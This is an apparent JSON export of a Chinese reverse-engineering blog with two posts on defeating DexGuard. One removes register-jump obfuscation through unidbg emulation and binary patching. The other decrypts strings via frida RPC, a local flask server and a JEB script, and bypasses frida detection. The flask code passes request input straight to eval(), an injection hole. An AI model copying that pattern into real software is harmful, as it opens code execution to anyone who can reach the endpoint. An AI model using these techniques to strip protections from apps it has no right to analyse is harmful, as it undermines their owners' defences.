{"meta":{"title":"oaciaのBbBlog~","subtitle":"DEVIL or SWEET","description":"月遇从云 花遇和风","author":"oacia","url":"https://oacia.dev","root":"/"},"pages":[],"posts":[{"title":"dexguard反混淆-unidbg去除BR寄存器跳转","slug":"unidbg-anti-br","date":"2024-09-08T10:14:21.000Z","updated":"2025-04-08T18:55:12.020Z","comments":true,"path":"unidbg-anti-br/","link":"","permalink":"https://oacia.dev/unidbg-anti-br/","excerpt":"","text":"# 前言 这几天一直在和 so 层的强混淆对抗，前几天有朋友问我有没有试过 IL 层面的反混淆，正好这个月遇到了一个 dexguard 的强混淆样本，所以就想试试 IL 层面的反混淆，ida 中最为出名的应该就是 ida microcode 了，但即使在两年前曾经为了研究区块链合约的字节码而学习过李樾和谭添老师的静态分析，然而并没有什么太大的进展… 果然 static analysis 是一门大学问呐 ref Hex-Rays Microcode API vs. Obfuscating Compiler 之后又去试了试 Binary Ninja , 现在它的 medium IL 从编译器层面已经优化已经棒了，甚至有些 br 跳转的地址都可以自动在 IL 中体现出来 不过还是没有办法直接去操作 IL, 所以最终回归到了 aarch64 汇编层面的 patch, 只是倘若遇到不透明谓词和指令替换的话，bninja 就没有办法自动计算出来这个这个自动计算的地址了 所以为了可以完整的去除 br 寄存器跳转，还得是 unidbg 呀！ 关于 unidbg 的基本用法，可以参考 unidbg 学习笔记 一篇非常好的文章 [原创] 记一次基于 unidbg 模拟执行的去除 ollvm 混淆 # unidug 环境搭建 首先在 unidbg-android/src/test/java 新建一个我们自己的 package 和类，然后初始化一下 antibr()&#123; instructions = new ArrayDeque&lt;>(); patch_list = new ArrayList&lt;>(); emulator = AndroidEmulatorBuilder.for64Bit() .setProcessName(\"com.test.antibr\") //.addBackendFactory(new Unicorn2Factory(true)) .build(); // 创建模拟器实例，要模拟 32 位或者 64 位，在这里区分 final Memory memory = emulator.getMemory(); // 模拟器的内存操作接口 memory.setLibraryResolver(new AndroidResolver(23)); // 设置系统类库解析 vm = emulator.createDalvikVM(); // 创建 Android 虚拟机 vm.setVerbose(false); // 设置是否打印 Jni 调用细节 DalvikModule dm = vm.loadLibrary(new File(\"unidbg-android/src/test/resources/test/libbdae.so\"), false); // 加载 libttEncrypt.so 到 unicorn 虚拟内存，加载成功以后会默认调用 init_array 等函数 module = dm.getModule(); code_walk(); dm.callJNI_OnLoad(emulator); // 手动执行 JNI_OnLoad 函数 doPatch(); &#125;接下来，我们将对每一条运行过的指令利用 unidbg 的 unicorn 引擎进行 hook, 基本用法如下 public void code_walk()&#123; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; Capstone capstone = new Capstone(Capstone.CS_ARCH_ARM64,Capstone.CS_MODE_ARM); byte[] bytes = emulator.getBackend().mem_read(address, 4); Instruction[] disasm = capstone.disasm(bytes, 0); System.out.printf(\"%x:%s %s %s\\n\",address-module.base ,disasm[0].getMnemonic(),disasm[0].getOpStr(),disasm[0].getOperands()); &#125; @Override public void onAttach(UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, module.base, module.base+module.size, null);&#125;# 寄存器跳转基本类型 接下来我们考虑寄存器跳转混淆的基本类型，总体可以分为直接跳转和分支跳转这两种类型 # 直接跳转 对于直接跳转来说，我们只需要在 BR 或 BLR 跳转的地方直接 patch 这一行汇编即可完成去混淆 BR 直接跳转 BLR 直接跳转 # 分支跳转 一个标准的分支跳转由下面的四行指令构成，依次为比较 ( CMP 或 TST ), 条件赋值 ( CSEL ), 地址取值 ( LDR ), 跳转 ( BR ) 假设条件 EQ 满足时赋值为 [X12] , 所跳转的地址为 loc_a ; 条件 EQ 不满足时赋值为 [X9] , 所跳转的地址为 loc_b 由此我们可以将一个分支跳转还原成如下的指令: NOP #原 CMP 或 TST 需要被 NOPNOP #原 CSEL 需要被 NOPB.EQ loc_a #LDR 指令 patch 为 B.EQ 条件满足时的地址B loc_b #BR 指令 patch 为 B 条件不满足时跳转的地址这样即可完成一次分支跳转的修复 当然我们需要考虑到一些特殊的情况，例如下图所示 在 LDR 指令和 BR 指令间包含了其他的运行相关的指令，此时假如我们将 LDR 指令 patch 为分支跳转，将会导致参数的丢失，所以我们需要进行指令移动，将 LDR 指令下移到 BR 指令的上一行，同时将 BR 和 LDR 之间的指令上移一行 这一种情况经过修复之后的汇编应如下所示 NOPNOPMOV W19, #0x5D1D8BC9MOV X20, XZRB.NE loc_aB loc_b# unidbg 反混淆 要想对寄存器跳转去混淆，我们首先需要去辩别这个 BR 跳转究竟有没有分支，即判断之前运行过的指令中有没有 CSEL 相关的指令，为了实现指令和寄存器的回溯，我们必须要去维护一个数据结构去保存他们，倘若使用 Stack 这种后进先出的模式，那么随着指令的不断运行，这个 stack 会变地越来越大，这其实是我们不希望看到的。而 Queue 这种先进先出的模式，确实可以让我们维护一个最近运行的十条指令的循环队列，但是这也会带来一个问题就是当我们想进行指令回溯的时候，获取到的第一条指令并非 BR 跳转指令的上一条指令，所以这里的数据结构我们可以选择 Deque 这种双端队列的结构，来方便的去实现 添加元素到队尾 ， 取队尾元素并删除 以及当队列长度达到设定的阈值时，进行 取队首元素并删除 的操作 首先定义一个指令类 InsAndCtx ，在这个类定义了每运行一条指令后，需要记录的地址，汇编以及寄存器 // 保存指令和寄存器环境类：class InsAndCtx&#123; long addr; Instruction ins; List&lt;Number> regs; public long getAddr() &#123; return addr; &#125; public void setAddr(long addr) &#123; this.addr = addr; &#125; public void setIns(Instruction ins) &#123; this.ins = ins; &#125; public Instruction getIns() &#123; return ins; &#125; public void setRegs(List&lt;Number> regs) &#123; this.regs = regs; &#125; public List&lt;Number> getRegs() &#123; return regs; &#125;&#125;随后在 code_walk 中维护一个大小为 10 的循环双端队列 public void code_walk() &#123; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; Capstone capstone = new Capstone(Capstone.CS_ARCH_ARM64,Capstone.CS_MODE_ARM); byte[] bytes = emulator.getBackend().mem_read(address, 4); Instruction[] disasm = capstone.disasm(bytes, 0); InsAndCtx iac = new InsAndCtx(); iac.setIns(disasm[0]); iac.setRegs(saveRegs(backend)); iac.setAddr(address); // 可以当作一个队列去理解，当队列的大小超过 10 时，就删除队首的元素 if(instructions.size()>10)&#123; instructions.removeFirst(); &#125; // 向队列的队尾添加元素 instructions.addLast(iac); &#125; @Override public void onAttach(UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, module.base, module.base+module.size, null); &#125;而在 br 寄存器跳转去混淆之前，因为所有的 patch 都是在 unidbg 运行结束后进行 patch 的，所以我们需要定义一个 patch 类，用来记录 patch 相关的信息 private List&lt;PatchBR> patch_list;//patch 类class PatchIns&#123; long addr;//patch 地址 String ins;//patch 的指令 public long getAddr() &#123; return addr; &#125; public void setAddr(long addr) &#123; this.addr = addr; &#125; public String getIns() &#123; return ins; &#125; public void setIns(String ins) &#123; this.ins = ins; &#125;&#125;enum br_type&#123; direct_br,direct_blr,indirect_br;&#125;enum error_type&#123; ok, conflict_br_type, conflict_b_jump_address&#125;class PatchBR&#123; List&lt;PatchIns> patchs; List&lt;Long> br_jump_to; long br_addr; br_type type; error_type errorno; String error_info; PatchBR() &#123; patchs = new ArrayList&lt;>(); br_jump_to = new ArrayList&lt;>(); errorno = error_type.ok; &#125;&#125;之后便是寄存器跳转核心识别代码的编写了，主要就是将前面找出的基本类型所对应的情况一一判断过去 而 dexguard 的 BLR 寄存器跳转，是会跳转到外部的导入函数中去执行的，对于这种情况跳转，待跳转的地址在混淆库的外部，符号是不可知的，具体形如这种样子 在这种情况下，我们可以使用 unidbg 提供的 findClosestSymbolByAddress 函数来找到对应的符号 unidbg自实现地址反推符号 findHookedSymbol 自实现地址反推符号被确认其实是非必要的，此处仅作记录用 首先在 unidbg-api/src/main/java/com/github/unidbg/spi/ 下增加一个 HookedSymbol 类 package com.github.unidbg.spi;public class HookedSymbol &#123; private final long address; private final String library; private final String symbol; public HookedSymbol(long address, String library, String symbol) &#123; this.address = address; this.library = library; this.symbol = symbol; &#125; public long getAddress() &#123; return address; &#125; public String getLibrary() &#123; return library; &#125; public String getSymbol() &#123; return symbol; &#125;&#125;随后修改 unidbg-api/src/main/java/com/github/unidbg/spi/AbstractLoader.java , 修改的部分如图所示 protected final Map&lt;Long, HookedSymbol> hookedSymbolMap = new HashMap&lt;>();public final HookedSymbol findHookedSymbol(long address) &#123; return hookedSymbolMap.get(address);&#125;@Overridepublic final void addHookListener(HookListener listener) &#123; //hookListeners.add(listener); hookListeners.add((svcMemory, libraryName, symbolName, old) -> &#123; long addr = listener.hook(svcMemory, libraryName, symbolName, old); if (addr > 0) &#123; hookedSymbolMap.put(addr, new HookedSymbol(addr, libraryName, symbolName)); &#125; return addr; &#125;);&#125;之后在 unidbg-api/src/main/java/com/github/unidbg/spi/Loader.java 中加上先前添加的函数 findHookedSymbol HookedSymbol findHookedSymbol(long address);随后来到 unidbg-android/src/main/java/com/github/unidbg/linux/LinuxModule.java , 在此处重载 findClosestSymbolByAddress 函数 @Overridepublic Symbol findClosestSymbolByAddress(long address, boolean fast) &#123; class Mutable &#123; Symbol bestSymbol = null; &#125; Mutable mutable = new Mutable(); symbols.forEach((name, value) -> &#123; if (value.peer > address) return; if (mutable.bestSymbol == null || mutable.bestSymbol.getAddress() &lt; value.peer) &#123; mutable.bestSymbol = new VirtualSymbol(name, this, value.peer); &#125; &#125;); return mutable.bestSymbol;&#125; 通过地址寻找符号的代码如下，但是需要注意的是，其实 JNI 函数的调用也会用到 BLR 寄存器跳转，所以说如果我们发现一个非法地址无法找到对应的符号，那么保留这个 BLR 的寄存器跳转就可以啦 if(pb.br_jump_to.get(0)&lt;0||pb.br_jump_to.get(0)>module.size)&#123; long debug_addr = getRegValue(blr.ins.getOpStr(),blr.getRegs()).longValue(); Module module2 = emulator.getMemory().findModuleByAddress(debug_addr); Symbol symbol = module2 == null ? null : module2.findClosestSymbolByAddress(debug_addr, true); String moduleName = null; if (module2 != null) &#123; moduleName = module2.name; &#125; String symbolName = null; if (symbol != null) &#123; symbolName = symbol.getName(); &#125; long symbolAddr = 0; if (symbol != null) &#123; symbolAddr = symbol.getAddress(); System.out.println(\"[debug] try to resolve symbol: \"+moduleName+\",\"+symbolName+\",\"+symbolAddr); &#125;&#125;所以说最终的 br 反混淆代码如下～ package com.test.antibr;import capstone.Capstone;import capstone.api.Instruction;import com.alibaba.fastjson.util.IOUtils;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Module;import com.github.unidbg.Symbol;import com.github.unidbg.arm.backend.Backend;import com.github.unidbg.arm.backend.CodeHook;import com.github.unidbg.arm.backend.UnHook;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.DalvikModule;import com.github.unidbg.linux.android.dvm.VM;import com.github.unidbg.memory.Memory;import com.github.unidbg.spi.HookedSymbol;import com.github.unidbg.spi.LibraryFile;import com.github.unidbg.utils.Inspector;import keystone.Keystone;import keystone.KeystoneArchitecture;import keystone.KeystoneEncoded;import keystone.KeystoneMode;import unicorn.Arm64Const;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.util.*;public class antibr &#123; private final AndroidEmulator emulator; private final VM vm; private final Module module; private Deque&lt;InsAndCtx> instructions; private List&lt;PatchBR> patch_list; private static final String inName = \"D:\\\\work\\\\test\\\\aiti-br\\\\libbdae.so\"; private static final String outName = \"D:\\\\work\\\\test\\\\aiti-br\\\\libbdae_fix.so\"; // 保存指令和寄存器环境类： class InsAndCtx &#123; long addr; Instruction ins; List&lt;Number> regs; public long getAddr() &#123; return addr; &#125; public void setAddr(long addr) &#123; this.addr = addr; &#125; public void setIns(Instruction ins) &#123; this.ins = ins; &#125; public Instruction getIns() &#123; return ins; &#125; public void setRegs(List&lt;Number> regs) &#123; this.regs = regs; &#125; public List&lt;Number> getRegs() &#123; return regs; &#125; &#125; //patch 类 class PatchIns&#123; long addr;//patch 地址 String ins;//patch 的指令 public long getAddr() &#123; return addr; &#125; public void setAddr(long addr) &#123; this.addr = addr; &#125; public String getIns() &#123; return ins; &#125; public void setIns(String ins) &#123; this.ins = ins; &#125; &#125; enum br_type &#123; direct_br,direct_blr,indirect_br; &#125; enum error_type&#123; ok, conflict_br_type, conflict_b_jump_address &#125; class PatchBR&#123; List&lt;PatchIns> patchs; List&lt;Long> br_jump_to; long br_addr; br_type type; error_type errorno; String error_info; PatchBR() &#123; patchs = new ArrayList&lt;>(); br_jump_to = new ArrayList&lt;>(); errorno = error_type.ok; &#125; &#125; public List&lt;Number> saveRegs(Backend bk) &#123; List&lt;Number> nb = new ArrayList&lt;>(); for(int i=0;i&lt;29;i++) &#123; nb.add(bk.reg_read(i+ Arm64Const.UC_ARM64_REG_X0)); &#125; nb.add(bk.reg_read(Arm64Const.UC_ARM64_REG_FP)); nb.add(bk.reg_read(Arm64Const.UC_ARM64_REG_LR)); return nb; &#125; public Number getRegValue(String reg,List&lt;Number> regsaved) &#123; if(reg.equals(\"xzr\")) &#123; return 0; &#125; return regsaved.get(Integer.parseInt(reg.substring(1))); &#125; public boolean validBRPatch(PatchBR pb)&#123; for (PatchBR _pb : patch_list) &#123; if (pb.br_addr == _pb.br_addr) &#123; if(pb.type!=_pb.type)&#123; pb.errorno = error_type.conflict_br_type; pb.error_info = \"[error]confict br jump type at 0x\"+Integer.toHexString((int) pb.br_addr)+\"type->\"+pb.type+\" \"+_pb.type; &#125; else if(pb.br_jump_to!=_pb.br_jump_to)&#123; pb.errorno = error_type.conflict_b_jump_address; pb.error_info = \"[error]confict b jump address at 0x\"+Integer.toHexString((int) pb.br_addr)+\"addr->\"+pb.br_jump_to.toString()+\" \"+_pb.br_jump_to.toString(); &#125; return false; &#125; &#125; return true; &#125; public long readInt64(Backend bk,long addr) &#123; byte[] bytes = bk.mem_read(addr, 8); long res = 0; for (int i=0;i&lt;bytes.length;i++) &#123; res =((bytes[i]&amp;0xffL) &lt;&lt; (8*i)) + res; &#125; return res; &#125; antibr()&#123; instructions = new ArrayDeque&lt;>(); patch_list = new ArrayList&lt;>(); emulator = AndroidEmulatorBuilder.for64Bit() .setProcessName(\"com.test.antibr\") //.addBackendFactory(new Unicorn2Factory(true)) .build(); // 创建模拟器实例，要模拟 32 位或者 64 位，在这里区分 final Memory memory = emulator.getMemory(); // 模拟器的内存操作接口 memory.setLibraryResolver(new AndroidResolver(23)); // 设置系统类库解析 vm = emulator.createDalvikVM(); // 创建 Android 虚拟机 vm.setVerbose(false); // 设置是否打印 Jni 调用细节 DalvikModule dm = vm.loadLibrary(new File(\"unidbg-android/src/test/resources/test/libbdae.so\"), false); // 加载 libttEncrypt.so 到 unicorn 虚拟内存，加载成功以后会默认调用 init_array 等函数 module = dm.getModule(); code_walk(); dm.callJNI_OnLoad(emulator); // 手动执行 JNI_OnLoad 函数 doPatch(); &#125; public static void main(String[] args) throws Exception &#123; antibr test = new antibr(); test.destroy(); &#125; public void code_walk() &#123; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; Capstone capstone = new Capstone(Capstone.CS_ARCH_ARM64,Capstone.CS_MODE_ARM); byte[] bytes = emulator.getBackend().mem_read(address, 4); Instruction[] disasm = capstone.disasm(bytes, 0); InsAndCtx iac = new InsAndCtx(); iac.setIns(disasm[0]); iac.setRegs(saveRegs(backend)); iac.setAddr(address); // 可以当作一个队列去理解，当队列的大小超过 10 时，就删除队首的元素 if(instructions.size()>10)&#123; instructions.removeFirst(); &#125; // 向队列的队尾添加元素 instructions.addLast(iac); do_processbr(backend); //System.out.printf(\"%x:%s %s %s\\n\",address-module.base ,disasm[0].getMnemonic(),disasm[0].getOpStr(),disasm[0].getOperands()); &#125; @Override public void onAttach(UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, module.base, module.base+module.size, null); &#125; public void doPatch() &#123; try &#123; File f = new File(inName); FileInputStream fis = new FileInputStream(f); byte[] data = new byte[(int) f.length()]; fis.read(data); fis.close(); for(PatchBR pb:patch_list) &#123; if(pb.errorno==error_type.ok)&#123; for(PatchIns pi:pb.patchs)&#123; System.out.println(\"procrss addr: 0x\"+Integer.toHexString((int) pi.addr)+\",code: \"+pi.getIns()); Keystone ks = new Keystone(KeystoneArchitecture.Arm64, KeystoneMode.LittleEndian); KeystoneEncoded assemble = ks.assemble(pi.getIns(),(int)pi.getAddr()); for(int i=0;i&lt;assemble.getMachineCode().length;i++) &#123; data[(int) pi.addr+i] = assemble.getMachineCode()[i]; &#125; &#125; &#125; else&#123; System.out.println(\"[error] unable to patch at 0x\"+Integer.toHexString((int)(pb.br_addr))+pb.error_info); &#125; &#125; File fo = new File(outName); FileOutputStream fos = new FileOutputStream(fo); fos.write(data); fos.flush(); fos.close(); System.out.println(\"finish\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void do_processbr(Backend backend) &#123; InsAndCtx br = null,ldr = null,csel = null,cmp = null; List&lt;InsAndCtx> others = new ArrayList&lt;>(); InsAndCtx blr = null; InsAndCtx iac = instructions.peekLast(); if(iac.ins.getMnemonic().equals(\"br\")) &#123; br = iac; instructions.removeLast(); try &#123; while (!instructions.isEmpty()) &#123; iac = instructions.removeLast(); String[] split = iac.ins.getOpStr().split(\",\"); if(ldr==null &amp;&amp; iac.ins.getMnemonic().equals(\"ldr\"))&#123; if(split[0].toLowerCase(Locale.ROOT).trim().equals(br.ins.getOpStr()))&#123; ldr = iac; &#125; &#125; else if(csel==null &amp;&amp; iac.ins.getMnemonic().equals(\"csel\"))&#123; csel = iac; &#125; else if(cmp==null &amp;&amp; csel!=null &amp;&amp; (iac.ins.getMnemonic().equals(\"cmp\")||iac.ins.getMnemonic().equals(\"tst\")))&#123; cmp = iac; &#125; else&#123; others.add(iac); &#125; &#125; //br 直接跳转 if(csel==null)&#123; PatchBR pb = new PatchBR(); pb.type = br_type.direct_br; pb.br_addr = br.getAddr()-module.base; long pi1_addr = br.getAddr()-module.base; String pi1_ins = \"b 0x\" + Integer.toHexString((int)(getRegValue(br.ins.getOpStr(),br.getRegs()).longValue()-module.base)); pb.br_jump_to.add(getRegValue(br.ins.getOpStr(),br.getRegs()).longValue()-module.base); PatchIns pi1 = new PatchIns(); pi1.setAddr(pi1_addr); pi1.setIns(pi1_ins); pb.patchs.add(pi1); if(validBRPatch(pb))&#123; System.out.println(\"[info] find br jump at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); patch_list.add(pb); &#125; //System.out.println(\"0x\"+Integer.toHexString((int)(pi1_addr)) +\" \"+pi1_ins); &#125; //csel br 间接跳转 else&#123; PatchBR pb = new PatchBR(); pb.type = br_type.indirect_br; pb.br_addr = br.getAddr()-module.base; //System.out.println(\"[debug] found cesl-br at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); if(cmp!=null)&#123; PatchIns pi1 = new PatchIns(); pi1.setAddr(cmp.getAddr()-module.base); pi1.setIns(\"nop\"); pb.patchs.add(pi1); &#125; else&#123; System.out.println(\"[warn] cmp/tst not found at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); &#125; String[] sp = csel.ins.getOpStr().toLowerCase(Locale.ROOT).split(\",\"); String reg1 = sp[1].trim(); String reg2 = sp[2].trim(); String cond = sp[3].trim(); long branch1 = readInt64(backend,getRegValue(reg1,csel.getRegs()).longValue())-module.base; long branch2 = readInt64(backend,getRegValue(reg2,csel.getRegs()).longValue())-module.base; PatchIns pi2 = new PatchIns(); pi2.setAddr(csel.getAddr()-module.base); pi2.setIns(\"nop\"); pb.patchs.add(pi2); if(ldr!=null)&#123; // 需要进行指令上移 if(ldr.getAddr()-br.getAddr()>4)&#123; for(InsAndCtx _iac: others)&#123; if(_iac.getAddr()&lt; ldr.getAddr() &amp;&amp; _iac.getAddr()>br.getAddr())&#123; PatchIns _pi = new PatchIns(); _pi.setAddr(_iac.getAddr()-module.base-4); _pi.setIns(_iac.ins.toString()); pb.patchs.add(_pi); &#125; &#125; &#125; long current_br_jump_to = getRegValue(br.ins.getOpStr(),br.getRegs()).longValue()-module.base; if((!(current_br_jump_to==branch1))&amp;&amp;(!(current_br_jump_to==branch2)))&#123; System.out.println(\"[error] wrong jump address at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); &#125; else&#123; PatchIns pi3 = new PatchIns(); pi3.setAddr(pb.br_addr-4); pi3.setIns(\"b\"+cond.toLowerCase(Locale.ROOT) + \" 0x\"+ Integer.toHexString((int) (branch1))); pb.br_jump_to.add(branch1); pb.patchs.add(pi3); PatchIns pi4 = new PatchIns(); pi4.setAddr(pb.br_addr); pi4.setIns(\"b\" + \" 0x\"+ Integer.toHexString((int) (branch2))); pb.br_jump_to.add(branch2); pb.patchs.add(pi4); &#125; if(validBRPatch(pb))&#123; System.out.println(\"[info] find br jump at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); patch_list.add(pb); &#125; &#125; else&#123; System.out.println(\"[error] ldr not found at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); &#125; &#125; &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; instructions.clear(); &#125; //blr 直接跳转 else if(iac.ins.getMnemonic().equals(\"blr\"))&#123; blr = iac; instructions.removeLast(); PatchBR pb = new PatchBR(); pb.type = br_type.direct_blr; pb.br_addr = blr.getAddr()-module.base; long pi1_addr = blr.getAddr()-module.base; String pi1_ins = \"bl 0x\" + Integer.toHexString((int)(getRegValue(blr.ins.getOpStr(),blr.getRegs()).longValue()-module.base)); pb.br_jump_to.add(getRegValue(blr.ins.getOpStr(),blr.getRegs()).longValue()-module.base); PatchIns pi1 = new PatchIns(); pi1.setAddr(pi1_addr); pi1.setIns(pi1_ins); pb.patchs.add(pi1); if(validBRPatch(pb))&#123; if(pb.br_jump_to.get(0)&lt;0||pb.br_jump_to.get(0)>module.size)&#123; long debug_addr = getRegValue(blr.ins.getOpStr(),blr.getRegs()).longValue(); Module module2 = emulator.getMemory().findModuleByAddress(debug_addr); Symbol symbol = module2 == null ? null : module2.findClosestSymbolByAddress(debug_addr, true); String moduleName = null; if (module2 != null) &#123; moduleName = module2.name; &#125; String symbolName = null; long symbolAddr = 0; if (symbol != null) &#123; symbolName = symbol.getName(); symbolAddr = symbol.getAddress(); System.out.println(\"[symbol] resolve symbol ok: \"+moduleName+\",\"+symbolName+\",\"+symbolAddr); System.out.println(\"[info] find br jump at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); patch_list.add(pb); &#125; &#125; else&#123; System.out.println(\"[info] find br jump at 0x\"+Integer.toHexString((int)(pb.br_addr))+\" type:\"+pb.type); patch_list.add(pb); &#125; &#125; instructions.clear(); &#125; &#125; void destroy() &#123; IOUtils.close(emulator); System.out.println(\"destroy\"); &#125;&#125;# 参考资料 [原创] 记一次基于 unidbg 模拟执行的去除 ollvm 混淆 吾爱破解 2024 春节红包活动 WP (全，含 Android 高级题)","categories":[],"tags":[]},{"title":"DexGuard java字符串反混淆","slug":"dexguard-java-str-dec","date":"2024-09-03T10:14:21.000Z","updated":"2025-04-08T18:55:11.499Z","comments":true,"path":"dexguard-java-str-dec/","link":"","permalink":"https://oacia.dev/dexguard-java-str-dec/","excerpt":"","text":"# 前言 最近分析的 app 发现加了 DexGuard , 所以在 java 层遇到了非常强力的字符串混淆，甚至 jeb 这么强大的 java 反混淆工具都不能把字符串解密出来，所以本文是对 java 字符串反混淆的过程记录，通过 frida 的 RPC 调用，利用 python flask 搭建一个主动调用 java 字符串解密函数的 GET 接口，随后编写 jeb 脚本访问这个本地端口，并传入字符串解密函数的参数，获取字符串解密后的结果后替换 Element, 实现基于 frida RPC 主动调用的 java 字符串的反混淆 # 神奇的防 hook 手段 DexGuard 有一个非常神奇的地方就是这个混淆的字符串解密函数竟然没有办法 hook 到返回值？！ 将核心的部分提取出来之后写个 demo, 其 Java 代码如下，逻辑很简单，就是在调用 get_helloworld 获取拼接的字符串之前，先定义了一个 arr_object 对象数组并作为参数传入 get_helloworld 中，随后在 get_helloworld 中经过一顿拼接操作，将最终的返回值赋值给传入参数中的 arr_object , 随后调用 Toast.makeText 打印拼接后的字符串 private static void get_helloworld(String hello,String world,Object[])&#123; String ret_value = hello+world+\"get!\"; arr_object[0]=ret_value;&#125;@Overrideprotected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); Object[] arr_object = new Object[1]; get_helloworld(\"hello\",\"world\",arr_object); Toast.makeText(global_context, (String)arr_object[0], Toast.LENGTH_SHORT).show();&#125;通过这种方式进行函数返回值的传递，被证实确实是可行的，我们看到弹窗弹出的内容也符合 get_helloworld 函数执行完后的预期 然而当我们尝试用的 frida 代码去 hook get_helloworld , 想要读取通过对象数组传递的返回值之后却发现 function hook()&#123; console.log('start hook'); Java.perform(() =>&#123; var app = Java.use(\"com.example.mytest.MainActivity\"); app.get_helloworld.implementation = function (str1,str2,arr_object) &#123; console.log('before call get_helloworld: str1=',str1,'str2=',str2,'arr_object=',arr_object); var ret = this.get_helloworld(str1,str2,arr_object); console.log('after call get_helloworld: str1=',str1,'str2=',str2,'arr_object=',arr_object,',ret=',ret); return ret; &#125; &#125;)&#125;setImmediate(hook)nothing happened… 打印调用原函数前后的 arr_object , 发现都是空值 在这个地方纠结了好几天之后我就在想，究竟是什么原因导致 hook 这个对象的返回值失败了呢？难道是 frida 有 bug, 所以我就去看了 frida art hook 的源码和原理，感觉也没啥问题呀，还是说我的 frida 的打开方式有问题呢 那来看看这个对象有哪些属性吧 console.log('arr_object has those properties->', Object.getOwnPropertyNames(arr_object)); 欸打印看看这个 $w , 没想到竟然可以成功的打印出 Object 来？！ 这个 $w 是什么东西，为什么 arr_object 用 $w 属性就可以拿到正确的对象，但是打印原始的 arr_object 却一直是空？ 进到 frida-java-bridge 里面去看看是什么情况 首先找到 $w 定义的地方，这个 this[Symbol.for('w')] 是什么呢？ 向下翻翻源码后我们发现，没想到 $w 是 classWrapper , 拿到这个 classWrapper 之后才算是拿到了最初的值，amazing~ # frida RPC 调用 在字符串解密函数的返回值可以被成功的 hook 到之后，接下来我们便开始正式的字符串反混淆，这里需要用到 frida RPC 来主动调用字符串的解密函数，因为对于字符串混淆来说，不论解密的过程多么的复杂，我们只需要调用一下解密函数拿到解密后的结果就足够了 frida 的 rpc 调用代码如下，需要注意的是函数传入的是什么类型的数组，我们在构造函数的入参的时候也要用 Java.array 转换成对应类型的数组 function string_decrypt(a1,a2,a3,a4)&#123; var result; Java.perform(function ()&#123; var app = Java.use(\"com.test.Activity\"); if(a1==null)&#123; a1 = Java.array('int',[]); &#125; else&#123; a1 = Java.array('int',[a1]); &#125; if(a2==null)&#123; a2 = Java.array('char',[]); &#125; else&#123; a2 = Java.array('char',[a2]); &#125; a4 = Java.array('byte',a4); var ret; var obj_cls = Java.use('[Ljava.lang.Object;'); ret = Java.array('Ljava.lang.Object;',[null]); app.bc(a1,a2,a3,a4,ret); var objArr = Java.cast(ret.$w, obj_cls); var ArrayClz = Java.use(\"java.lang.reflect.Array\"); var len = ArrayClz.getLength(objArr); var arr =[] for(let i=0;i!==len;i++)&#123; arr.push(ArrayClz.get(objArr,i).toString()); &#125; console.log('hook return value123->',arr[0]); result = arr[0]; &#125;) return result;&#125;rpc.exports = &#123; // 如果 js 导出函数中包含驼峰命名，则 python 需要将大写替换成_小写，如 getUser => get_user stringdecrypt:string_decrypt,&#125;;同时因为 dexguard 是有 frida 检测的，一旦检测到 frida 进程就会闪退，所以我们可以在 frida 的检测点之前找个点去 hook, 例如可以 hook Activity 的 attachBaseContext , 然后通过 Thread.sleep(9999); 让进程永久的暂停下去，虽然 Thread 已经 sleep 了，但是我们的 RPC 主动调用解密函数这个过程依然可以正常进行 # flask 搭个本地服务器 接下来我们用 flask 去搭一个本地的接口，来让 jeb 脚本可以访问到啦，这里我使用的是 flask , 由于 flask 支持的是 wsgi 协议，而 uvicorn 只能用 asgi 协议，所以我们需要用 asgiref 中的 WsgiToAsgi 将 asgi 转换成 wsgi , 代码如下 import codecsimport fridafrom flask import Flask, requestfrom asgiref.wsgi import WsgiToAsgifrom time import sleepimport jsonimport uvicorndef onMessage(message, data): #print(message) if message[\"type\"] == 'send': print(u\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)app = Flask(import_name=__name__)asgi_app = WsgiToAsgi(app)device = frida.get_device_manager().add_remote_device(\"127.0.0.1:1234\")pkg = \"com.test.activ\" #包名pid = device.spawn([pkg])session = device.attach(pid)with codecs.open('./str_dec.js', 'r', encoding='utf-8') as f: source = f.read()script = session.create_script(source)script.on('message', onMessage)script.load()#注入脚本device.resume(pid)sleep(1)#这里得 sleep 1 秒，来让脚本加载完成rpc = script.exports_sync# 通过 methods 设置 GET 请求@app.route('/strdec', methods=[\"GET\"])def json_request(): # 接收处理 json 数据请求 data = eval(request.args.get(\"body\")) print(f'[*] receive &#123;data&#125;') print(type(data)) method = data[\"method\"] result = None if method == \"bc\":#处理函数名为 bc 的字符串加密函数 argv1 = data['argv1'] argv2 = data['argv2'] argv3 = data['argv3'] argv4 = data['argv4'] result = rpc.stringDecrypt(argv1,argv2,argv3,argv4) return resultuvicorn.run(asgi_app,host='127.0.0.1', port=8080)# Jeb Script 反混淆 这里字符串混淆的代码和之前用过的差不多，只是字符串解密函数 bc_decryptstring 这里，需要注意用 jeb 自带的网络库 Net().query 和先前 flask 创建的接口交互，到了这里基于主动调用的字符串反混淆就基本上完成了 # coding=utf-8from com.pnfsoftware.jeb.client.api import IScript, IconType, 